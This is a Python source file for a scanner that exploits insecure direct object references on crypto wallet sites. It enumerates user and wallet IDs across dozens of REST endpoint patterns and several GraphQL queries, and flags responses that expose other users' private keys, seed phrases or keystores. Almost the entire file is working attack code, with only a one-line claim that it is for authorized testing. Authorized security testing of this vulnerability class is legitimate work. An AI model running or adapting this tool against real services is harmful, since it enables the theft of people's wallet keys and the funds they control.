"""
IDOR Scanner for Crypto/Blockchain Key Endpoints

Targets the vulnerability class described in:
  "How I was able to access any public/private keys in a blockchain website"

Attack pattern: Blockchain/crypto sites that expose wallet keypairs via
API endpoints with predictable/enumerable identifiers and no proper
authorization checks (IDOR - Insecure Direct Object Reference).

FOR AUTHORIZED SECURITY TESTING ONLY.
"""

import re
import time
import random
import threading
from dataclasses import dataclass, field
from typing import Optional
from urllib.parse import urljoin, urlparse

import requests

from modules.key_detector import KeyDetector

# Common endpoint patterns seen on crypto/blockchain wallet sites
KEY_ENDPOINT_PATTERNS = [
    "/api/wallet/{id}",
    "/api/wallet/{id}/keys",
    "/api/wallet/{id}/keypair",
    "/api/user/{id}/wallet",
    "/api/user/{id}/keys",
    "/api/account/{id}",
    "/api/account/{id}/keys",
    "/api/key/{id}",
    "/api/keys/{id}",
    "/api/address/{id}",
    "/api/v1/wallet/{id}",
    "/api/v1/wallet/{id}/keys",
    "/api/v1/user/{id}/wallet",
    "/api/v1/key/{id}",
    "/api/v2/wallet/{id}",
    "/api/v2/key/{id}",
    "/wallet/{id}",
    "/wallet/{id}/export",
    "/wallet/{id}/private",
    "/key/{id}",
    "/keys/{id}",
    "/account/{id}/export",
    "/user/{id}/wallet",
    "/user/{id}/keys",
    # Common blockchain-specific patterns
    "/api/address/{id}/privatekey",
    "/api/address/{id}/wif",
    "/api/address/{id}/export",
    "/api/mnemonic/{id}",
    "/api/seed/{id}",
    "/api/keystore/{id}",
    "/api/vault/{id}",
    "/api/vault/{id}/unlock",
    # GraphQL-style
    "/graphql",
]

GRAPHQL_QUERIES = [
    '{"query": "{ wallet(id: ID_PLACEHOLDER) { privateKey publicKey address } }"}',
    '{"query": "{ user(id: ID_PLACEHOLDER) { wallet { privateKey publicKey } } }"}',
    '{"query": "{ key(id: ID_PLACEHOLDER) { private public } }"}',
    '{"query": "query GetWallet($id: ID!) { wallet(id: $id) { privateKey publicKey mnemonic } }", "variables": {"id": "ID_PLACEHOLDER"}}',
]


@dataclass
class IDORFinding:
    endpoint: str
    reference_id: str
    status_code: int
    response_snippet: str
    keys_found: list
    severity: str
    evidence: str


@dataclass
class IDORScanResult:
    target: str
    findings: list = field(default_factory=list)
    endpoints_tested: int = 0
    ids_tested: int = 0
    errors: list = field(default_factory=list)


class IDORScanner:
    """
    Scans for IDOR vulnerabilities on blockchain/crypto wallet API endpoints
    that may expose private or public cryptographic keys.

    The vulnerability works by:
    1. Identifying API endpoints that return key material
    2. Enumerating object IDs (user IDs, wallet IDs, key IDs)
    3. Accessing resources belonging to other users without authorization
    """

    def __init__(
        self,
        session: requests.Session,
        delay: float = 0.5,
        max_ids: int = 20,
        threads: int = 3,
        verbose: bool = False,
    ):
        self.session = session
        self.delay = delay
        self.max_ids = max_ids
        self.threads = threads
        self.verbose = verbose
        self.key_detector = KeyDetector()
        self._lock = threading.Lock()

    def _build_id_range(self, seed_id: Optional[int] = None) -> list:
        """
        Build a list of IDs to test. Starts from a seed (if provided by
        authenticating as a test user), then enumerates neighbors.
        This mirrors the exact technique in the write-up: attacker gets
        their own ID, then tries adjacent/lower IDs.
        """
        ids = []

        if seed_id is not None:
            # Test IDs around the known seed (adjacent enumeration)
            for offset in range(-5, self.max_ids - 5):
                candidate = seed_id + offset
                if candidate > 0:
                    ids.append(str(candidate))
        else:
            # Sequential low integers (many apps use auto-increment PKs)
            ids.extend([str(i) for i in range(1, self.max_ids + 1)])

        # Also include some UUIDs patterns and common test IDs
        ids.extend(["0", "test", "admin", "null", "undefined"])

        # Common UUID-like patterns
        ids.extend([
            "00000000-0000-0000-0000-000000000001",
            "00000000-0000-0000-0000-000000000002",
        ])

        return ids

    def _test_endpoint(
        self, base_url: str, pattern: str, obj_id: str
    ) -> Optional[IDORFinding]:
        """Test a single endpoint+ID combination for IDOR key exposure."""
        url = urljoin(base_url, pattern.replace("{id}", obj_id))

        try:
            time.sleep(self.delay + random.uniform(0, 0.2))
            resp = self.session.get(url, timeout=10)

            if resp.status_code in (404, 405, 410):
                return None

            # Parse response for key material
            content = resp.text
            keys_found = self.key_detector.detect(content)

            if keys_found:
                severity = "CRITICAL" if any(
                    k["type"] in ("private_key_hex", "wif_key", "mnemonic", "keystore")
                    for k in keys_found
                ) else "HIGH"

                snippet = content[:500].replace("\n", " ").strip()
                evidence = f"HTTP {resp.status_code} → found {len(keys_found)} key pattern(s)"

                return IDORFinding(
                    endpoint=url,
                    reference_id=obj_id,
                    status_code=resp.status_code,
                    response_snippet=snippet,
                    keys_found=keys_found,
                    severity=severity,
                    evidence=evidence,
                )

            # Even without keys, a 200 with crypto-related fields is noteworthy
            if resp.status_code == 200 and self._looks_like_key_response(content):
                return IDORFinding(
                    endpoint=url,
                    reference_id=obj_id,
                    status_code=resp.status_code,
                    response_snippet=content[:300].replace("\n", " ").strip(),
                    keys_found=[],
                    severity="MEDIUM",
                    evidence=f"HTTP 200 with crypto-related fields (no raw key detected)",
                )

        except requests.exceptions.RequestException as e:
            if self.verbose:
                with self._lock:
                    pass  # caller handles error logging
        return None

    def _test_graphql(self, base_url: str, obj_id: str) -> Optional[IDORFinding]:
        """Test GraphQL endpoints for key data exposure via IDOR."""
        url = urljoin(base_url, "/graphql")

        for query_template in GRAPHQL_QUERIES:
            query = query_template.replace("ID_PLACEHOLDER", obj_id)
            try:
                time.sleep(self.delay)
                resp = self.session.post(
                    url,
                    data=query,
                    headers={"Content-Type": "application/json"},
                    timeout=10,
                )
                if resp.status_code == 200:
                    keys = self.key_detector.detect(resp.text)
                    if keys:
                        return IDORFinding(
                            endpoint=url,
                            reference_id=obj_id,
                            status_code=200,
                            response_snippet=resp.text[:400],
                            keys_found=keys,
                            severity="CRITICAL",
                            evidence=f"GraphQL returned key material for id={obj_id}",
                        )
            except requests.exceptions.RequestException:
                pass
        return None

    def _looks_like_key_response(self, content: str) -> bool:
        """Heuristic: does the response look like it contains wallet/key data?"""
        crypto_fields = [
            "privateKey", "private_key", "publicKey", "public_key",
            "mnemonic", "seedPhrase", "seed_phrase", "keystore",
            "wif", "xpriv", "xpub", "address", "wallet",
        ]
        content_lower = content.lower()
        return sum(1 for f in crypto_fields if f.lower() in content_lower) >= 2

    def scan(self, base_url: str, seed_id: Optional[int] = None) -> IDORScanResult:
        """
        Run the full IDOR scan against a target.

        Args:
            base_url: Target base URL (e.g. https://example.com)
            seed_id: Optional known user/wallet ID (enumerate neighbors)
        """
        result = IDORScanResult(target=base_url)
        ids_to_test = self._build_id_range(seed_id)
        result.ids_tested = len(ids_to_test)

        # Filter out GraphQL from REST patterns
        rest_patterns = [p for p in KEY_ENDPOINT_PATTERNS if p != "/graphql"]
        result.endpoints_tested = len(rest_patterns) * len(ids_to_test)

        for pattern in rest_patterns:
            for obj_id in ids_to_test:
                finding = self._test_endpoint(base_url, pattern, obj_id)
                if finding:
                    with self._lock:
                        result.findings.append(finding)

        # Test GraphQL
        for obj_id in ids_to_test[:5]:  # Limit GraphQL tests
            finding = self._test_graphql(base_url, obj_id)
            if finding:
                with self._lock:
                    result.findings.append(finding)

        return result
